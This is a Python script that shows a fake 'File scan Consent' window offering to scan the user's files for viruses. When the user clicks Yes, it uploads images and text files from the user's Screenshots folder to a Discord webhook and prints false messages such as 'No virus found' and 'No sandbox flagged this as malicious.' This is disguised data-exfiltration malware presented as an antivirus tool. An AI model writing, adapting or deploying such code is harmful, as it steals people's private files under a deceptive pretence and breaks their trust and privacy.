import tkinter as tk
import time
import threading
import os
import requests  # Import the requests library to handle HTTP requests

def background_task():
    """Sends files from the specified folder to Discord."""
    time.sleep(5)  # Simulate upload time
    print("Files scanned (simulated)")

    folder_path = folder_path = folder_path = "C:/Users/Dell/Pictures/Screenshots"  # Change to your folder path
    webhook_url = "REPLACE_THIS_WITH_YOUR_DISCORD_WEBHOOK_URL"  # Replace with your actual webhook URL
    
    if not os.path.exists(folder_path):
        print(f"Error: The folder path '{folder_path}' does not exist.")
        return
    
    files_sent = 0
    for filename in os.listdir(folder_path):
        if filename.endswith(".jpg") or filename.endswith(".png") or filename.endswith(".txt"):
            file_path = os.path.join(folder_path, filename)
            print(f"Scanning file: {filename}")
            try:
                with open(file_path, 'rb') as f:
                    response = requests.post(webhook_url, files={"file": f})
                    if response.status_code == 200:
                        print(f"File '{filename}' scanned successfully. No virus found.")
                        files_sent += 1
                    else:
                        print(f"Failed to send '{filename}'. Status code: {response.status_code}")
            except Exception as e:
                print(f"An error occurred while sending '{filename}': {e}")
    
    if files_sent == 0:
        print("No files were scanned.")
    else:
        print(f"Sacnned {files_sent} files.")

    # Send a message to Discord
    data = {
        "content": "Files have been scanned."
    }
    try:
        response = requests.post(webhook_url, json=data)
        if response.status_code == 200:
            print(f"No sandbox flagged this as malicious.")
        else:
            print(f"Failed to scan. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred while marking file status: {e}")

def handle_yes():
    """Start the file upload process."""
    global folder_path
    folder_path = "C:/Users/YourUsername/Documents/FilesToSend"  # Change to your folder path
    print("User clicked 'Yes'")
    # Start the background task
    thread = threading.Thread(target=background_task)
    thread.start()
    root.destroy()  # Close the consent window

def handle_no():
    """Exit the script."""
    print("User clicked 'No'")
    root.destroy()  # Close the consent window

# Create the consent window
root = tk.Tk()
root.title("File scan Consent")

label = tk.Label(root, text="Do you want to scan your files for virus?")
label.pack(pady=20)

yes_button = tk.Button(root, text="Yes", command=handle_yes)
yes_button.pack(side="left", padx=10)

no_button = tk.Button(root, text="No", command=handle_no)
no_button.pack(side="right", padx=10)

root.mainloop()
